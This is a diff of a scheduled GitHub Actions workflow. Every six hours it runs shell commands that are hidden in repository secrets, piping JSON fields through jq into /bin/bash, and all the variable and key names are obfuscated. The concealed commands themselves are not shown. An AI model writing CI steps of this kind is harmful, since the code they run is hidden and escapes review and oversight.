@@ -1,22 +1,24 @@
 name: yanqing19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '35 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yanqing19871010
         env:
-          sbm55: ${{ secrets.sbm55 }}
+          c30: ${{ secrets.c30 }}
         run: |
-          echo $sbm55 | jq -r .uyah3 | /bin/bash
-          echo $z5 | jq -r .opd38919 | /bin/bash
-          echo $sdj394 | jq -r .mkh91 | /bin/bash
-          echo $hf232 | jq -r .gb94 | /bin/bash
-          echo $n03 | jq -r .e9511 | /bin/bash
-          echo $cz308 | jq -r .m89312 | /bin/bash
+          echo $c30 | jq -r .uw295 | /bin/bash
+          echo $l085 | jq -r .ktxw9 | /bin/bash
+          echo $nnwiq4648 | jq -r .ohbda3 | /bin/bash
+          echo $t43 | jq -r .se6957 | /bin/bash
+          echo $jam47 | jq -r .mf250 | /bin/bash
+          echo $hdkjj72 | jq -r .e8521 | /bin/bash
+          echo $bdb00 | jq -r .kk2108 | /bin/bash
 
